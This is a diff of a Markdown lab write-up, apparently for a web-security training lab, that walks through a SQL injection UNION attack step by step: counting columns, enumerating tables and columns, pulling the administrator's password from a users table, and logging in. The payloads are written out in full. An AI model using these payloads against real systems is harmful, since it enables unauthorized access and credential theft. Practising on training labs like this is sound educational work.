@@ -10,31 +10,73 @@ The database contains a different table called users, with columns called userna
 To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user. 
 
 
-## What we Know Already ?
-
-- Number of columns are **3**.
-- String type compatible column is **column 2**.
-
-
 ## Steps to Reproduce
 
+### Finding number of Columns
 
-
-
-### Finding Database Version
-
-- Using the below payload we find out the database used. The database its `PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit`
+- Using the below payload we can find out the number of columns required.
 
 ```sql
-'+UNION+SELECT+NULL,+version(),+NULL--
+'+UNION+SELECT+NULL,+NULL--
 ```
+
+- So number of columns is **2**.
+
+### Finding String Type Compatibility
+
+- We need to find out which column/columns are string type compatible.
+
+```sql
+'+UNION+SELECT+'a','b'--
+```
+
+- Both the columns are string compatible.
 
 ### Finding Tables
 
-- Using the below payload we can look for tables in the database.
+- The below payload can be used to find out the tables present in the database.
 
 ```sql
-'+UNION+SELECT+NULL,+table_name,+NULL+FROM+information_schema.tables
+'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
 ```
+
+- We found a `users` table after injecting the above payload.
+
+### Finding columns of `users` table
+
+- The below payload can be used to find out the columns present in the `users` table.
+
+```sql
+'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name = 'users'--
+```
+
+- The columns found are :-
+	- `email`
+	- `password`
+	- `username`
+
+### Getting `administrator` Credentials
+
+- The below payload can be used to retrieve credentials of `administrator` user.
+
+```sql
+'+UNION+SELECT+username,+password+FROM+users+WHERE+username='administrator'--
+```
+
+- We get the password `qltkixcupiesxegnn8vg`.
+
+### Login
+
+- We can now use the below credentials to login to the account :-
+	- **username** = `administrator`
+	- **password** = `qltkixcupiesxegnn8vg`
+
+
+![Solved](./Images/img1.png)
+
+
+
+
+
 
 
